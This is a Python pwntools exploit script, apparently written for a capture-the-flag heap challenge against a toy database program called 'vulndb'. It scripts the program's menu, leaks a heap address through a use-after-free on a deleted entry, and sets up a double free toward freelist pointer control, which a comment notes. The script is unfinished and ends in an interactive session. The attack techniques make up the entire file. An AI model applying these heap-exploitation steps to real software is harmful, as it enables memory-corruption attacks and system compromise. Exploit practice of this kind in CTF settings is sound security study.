#! /usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

def create_db(name):
    r.sendlineafter('>>', 'Create db')
    r.sendlineafter('name:', name)
    print(r.recvline())

def delete_db(idx):
    r.sendlineafter('>>', 'Delete db')
    r.sendlineafter('id:', str(idx))

def select_db(idx):
    r.sendlineafter('>>', 'Select db')
    r.sendlineafter('id:', str(idx))

# TODO more = 'yes'
def create_table(tb_name, col_name, col_type, more='no'):
    r.sendlineafter('>>', 'Create table')
    r.sendlineafter('Table name:', tb_name)
    r.sendlineafter('Column name:', col_name)
    r.sendlineafter(':', str(col_type))
    r.sendlineafter('?', more)

def Drop_table(name):
    r.sendlineafter('>>', 'Drop table')
    r.sendlineafter('name:', name)
    print(r.recvline())

def insert(tb_name, data=''):
    r.sendlineafter('>>', 'Insert')
    r.sendafter('name:', tb_name)
    query = r.recvuntil(':', timeout=1).decode()
    if(query[1] == '[' and query[-1] == ':'):
        print(query)
        r.sendline(data)

def select_all(tb_name):
    r.sendlineafter('>>', 'Select all')
    r.sendlineafter('name:', tb_name)

def select(tb_name, row_id):
    r.sendlineafter('>>', 'Select')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    print(r.recvuntil('[')[:-1])

def delete(tb_name, row_id):
    r.sendlineafter('>>', 'Delete')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))

def update(tb_name, row_id, data):
    r.sendlineafter('>>', 'Update')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    r.sendlineafter(':', str(data))


def develop_mode(token='', data=''):
    r.sendlineafter('>>', 'developer mode')
    r.sendafter(':', token)
    if len(data):
        print(r.recvline())
        r.sendline(data)

def disconnect():
    r.sendlineafter('>>', 'Disconnect')
    print(r.recvline())

# r = process('./wrapper', env={"LD_LIBRARY_PATH":"."})
r = process('./vulndb', env={"LD_LIBRARY_PATH":"."})

create_db(b'asdasd')
create_db(b'asdasd')
create_db(b'db2')
create_db(b'db3')
create_db(b'db4')
create_db(b'db5')
delete_db(0)
delete_db(1)
select_db(1)

r.recvuntil(b'[db:')
heap = u64(r.recvuntil(b']', drop=True).ljust(8, b'\0')) - 0x2a0
log.info('heap: {:#x}'.format(heap))

select_db(2)
create_table('b'*8, 'c'*8, 3)
for i in range(4):
    insert('b'*8, 'e'*0x10)
for i in range(4):
    delete('b'*8, 0)

delete_db(3)
delete_db(4)
delete_db(3)

for i in range(3):
    insert('b'*8, 'e'*0x10)



# for i in range(3):
#     insert('b'*0x17, 'e'*0x10)

# insert('b'*0x17, 'f'*0x10) # can control fd



r.interactive()
